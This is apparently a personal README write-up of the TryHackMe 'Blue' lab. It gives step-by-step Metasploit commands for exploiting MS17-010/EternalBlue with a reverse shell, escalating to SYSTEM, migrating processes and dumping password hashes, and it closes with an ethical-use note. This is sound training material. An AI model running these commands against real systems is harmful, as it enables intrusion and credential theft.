# Blue — TryHackMe

> Beginner-friendly Windows exploitation lab focused on **MS17-010 / EternalBlue**, Metasploit, Meterpreter, privilege escalation, process migration, and password hash cracking.

## Overview

This repository documents my learning and practical work from the **Blue** room on TryHackMe.

The lab demonstrates a complete basic penetration-testing workflow:

```text
Reconnaissance
      ↓
Vulnerability Identification
      ↓
Exploitation
      ↓
Shell Access
      ↓
Meterpreter
      ↓
Privilege Escalation
      ↓
Process Migration
      ↓
Credential Dumping
      ↓
Password Cracking
```

## Learning Objectives

* Perform reconnaissance using Nmap
* Identify vulnerable SMB services
* Understand **MS17-010 / EternalBlue**
* Exploit a vulnerable Windows system using Metasploit
* Work with Windows shells and Meterpreter
* Escalate privileges to SYSTEM
* Enumerate and migrate processes
* Dump Windows password hashes
* Understand the fundamentals of password cracking

---

# Lab Tasks

## 1. Reconnaissance

The target does not respond to ICMP, so a ping-based host discovery approach may fail.

### Nmap Scan

```bash
nmap -sC -sV -Pn <TARGET_IP>
```

### What to Identify

* Open ports
* Running services
* Service versions
* Potential SMB vulnerabilities

### Vulnerability

The target is vulnerable to:

```text
MS17-010
```

This vulnerability is associated with the **EternalBlue** SMB exploit.

---

# 2. Gain Access

Start Metasploit:

```bash
msfconsole
```

Select the EternalBlue exploit:

```text
use exploit/windows/smb/ms17_010_eternalblue
```

Check the module configuration:

```text
show options
```

Set the required target information.

For the lab's requested payload:

```text
set payload windows/x64/shell/reverse_tcp
```

Run the exploit:

```text
run
```

If successful, a Windows command shell should be obtained.

Background the shell:

```text
CTRL + Z
```

---

# 3. Privilege Escalation

The next stage is converting the existing shell into a Meterpreter session.

### Shell-to-Meterpreter Module

```text
use post/multi/manage/shell_to_meterpreter
```

Check module options:

```text
show options
```

Set the required session:

```text
set SESSION <SESSION_ID>
```

Run the module:

```text
run
```

List available sessions:

```text
sessions
```

Interact with the resulting Meterpreter session:

```text
sessions -i <SESSION_ID>
```

---

## Verify SYSTEM Privileges

Attempt privilege escalation:

```text
getsystem
```

Open a Windows shell:

```text
shell
```

Verify the current user:

```cmd
whoami
```

Expected result:

```text
nt authority\system
```

Return to Meterpreter:

```text
exit
```

---

# 4. Process Migration

Having SYSTEM privileges does not necessarily mean that the current Meterpreter process is running inside the most suitable SYSTEM process.

List running processes:

```text
ps
```

Identify a suitable process running as:

```text
NT AUTHORITY\SYSTEM
```

Migrate to it:

```text
migrate <PROCESS_ID>
```

### Important

Process migration may fail because it is not always stable.

If necessary:

1. Try another suitable process.
2. Re-establish the Meterpreter session.
3. Repeat the migration attempt.

---

# 5. Credential Dumping

From the elevated Meterpreter session:

```text
hashdump
```

This can dump Windows password hashes when the session has sufficient privileges.

Identify the **non-default user** and copy the corresponding password hash.

Save the hash to a file for further analysis.

---

# Password Cracking

Research the hash format and use an appropriate password-cracking technique/tool in the authorized lab environment.

General workflow:

```text
Windows Hash
     ↓
Identify Hash Type
     ↓
Save Hash
     ↓
Password Cracking Tool
     ↓
Recovered Password
```

Only perform password cracking against systems and credentials you are authorized to test.

---

# Tools Used

| Tool                 | Purpose                                    |
| -------------------- | ------------------------------------------ |
| **Nmap**             | Network and service enumeration            |
| **Metasploit**       | Exploitation and post-exploitation         |
| **Meterpreter**      | Advanced post-exploitation                 |
| **hashdump**         | Windows password hash extraction           |
| **Password Cracker** | Recovering plaintext passwords from hashes |

---

# Important Commands

### Nmap

```bash
nmap -sC -sV -Pn <TARGET_IP>
```

### Metasploit

```text
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
show options
set payload windows/x64/shell/reverse_tcp
run
```

### Sessions

```text
sessions
sessions -i <SESSION_ID>
```

### Shell → Meterpreter

```text
use post/multi/manage/shell_to_meterpreter
show options
set SESSION <SESSION_ID>
run
```

### Privilege Escalation

```text
getsystem
```

### Process Enumeration/Migration

```text
ps
migrate <PROCESS_ID>
```

### Credential Dumping

```text
hashdump
```

---

# Key Concepts Learned

### MS17-010 / EternalBlue

A critical SMB vulnerability that can allow remote code execution against vulnerable Windows systems.

### Metasploit

A penetration-testing framework used to discover, configure, and execute exploits.

### Meterpreter

A Metasploit payload providing an interactive environment for post-exploitation activities.

### Privilege Escalation

The process of obtaining higher privileges than initially available.

### Process Migration

Moving a Meterpreter session into another running process, potentially improving stability or access.

### Credential Dumping

Extracting password hashes from a compromised system for authorized security testing.

---

# Ethical Use

All techniques documented here should only be used in:

* TryHackMe labs
* CTF environments
* Authorized penetration tests
* Systems you own or have explicit permission to test

Do **not** use EternalBlue, credential dumping, or password cracking against unauthorized systems.

---

# Learning Outcome

After completing this lab, I gained practical experience with:

* Windows network reconnaissance
* SMB vulnerability identification
* Metasploit exploitation
* Meterpreter sessions
* SYSTEM-level privileges
* Process migration
* Windows credential dumping
* Password-cracking fundamentals

---

# Lab Summary

**Room:** Blue
**Platform:** TryHackMe
**Difficulty:** Beginner
**Primary Vulnerability:** MS17-010 / EternalBlue
**Primary Framework:** Metasploit
**Post-Exploitation:** Meterpreter
**Target OS:** Windows

---

## Related Topics

* Nmap Enumeration
* SMB Security
* MS17-010
* EternalBlue
* Metasploit
* Meterpreter
* Windows Privilege Escalation
* Process Migration
* Windows Credential Security
* Password Hash Cracking

